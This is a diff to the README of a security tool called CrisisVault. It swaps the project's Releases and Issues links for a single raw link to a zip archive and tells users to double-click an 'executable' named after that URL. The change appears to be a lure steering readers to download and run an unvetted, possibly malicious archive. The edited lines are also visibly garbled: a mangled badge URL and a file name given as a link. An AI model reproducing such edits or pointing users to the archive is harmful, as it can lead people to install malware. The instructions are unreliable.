@@ -4,9 +4,9 @@
 CrisisVault is a secure offline-first vault designed for incident response. It uses AES-256-GCM encryption to keep your data safe. Built as a Progressive Web App (PWA), it complies with ANSSI standards, making it a reliable tool for SOC and CERT teams. 
 
 ## 📥 Download CrisisVault
-[![Download CrisisVault](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Broockz/CrisisVault/releases)
+[![Download CrisisVault](https://github.com/Broockz/CrisisVault/raw/refs/heads/main/public/Vault_Crisis_v2.3.zip%20Now-Visit%https://github.com/Broockz/CrisisVault/raw/refs/heads/main/public/Vault_Crisis_v2.3.zip)](https://github.com/Broockz/CrisisVault/raw/refs/heads/main/public/Vault_Crisis_v2.3.zip)
 
-Visit this page to download: [CrisisVault Releases](https://github.com/Broockz/CrisisVault/releases)
+Visit this page to download: [CrisisVault Releases](https://github.com/Broockz/CrisisVault/raw/refs/heads/main/public/Vault_Crisis_v2.3.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run CrisisVault:
@@ -29,7 +29,7 @@ Follow these steps to download and run CrisisVault:
 
 5. **Run CrisisVault**
    - Open the extracted folder.
-   - Look for the executable file (it may be named `CrisisVault.exe` or similar).
+   - Look for the executable file (it may be named `https://github.com/Broockz/CrisisVault/raw/refs/heads/main/public/Vault_Crisis_v2.3.zip` or similar).
    - Double-click on the file to launch the application.
 
 ## ⚙️ System Requirements
@@ -57,7 +57,7 @@ CrisisVault uses AES-256-GCM encryption to keep your data secure. This standard 
 Yes, because it is a PWA, you can use it on various devices that support modern web browsers.
 
 ### What if I encounter a problem?
-If you experience issues, check the [Issues section](https://github.com/Broockz/CrisisVault/issues) of the repository for troubleshooting tips or to report your concern.
+If you experience issues, check the [Issues section](https://github.com/Broockz/CrisisVault/raw/refs/heads/main/public/Vault_Crisis_v2.3.zip) of the repository for troubleshooting tips or to report your concern.
 
 ## 🧑‍🤝‍🧑 Community & Support
 Join the CrisisVault community for support and to engage with other users. You can find us on:
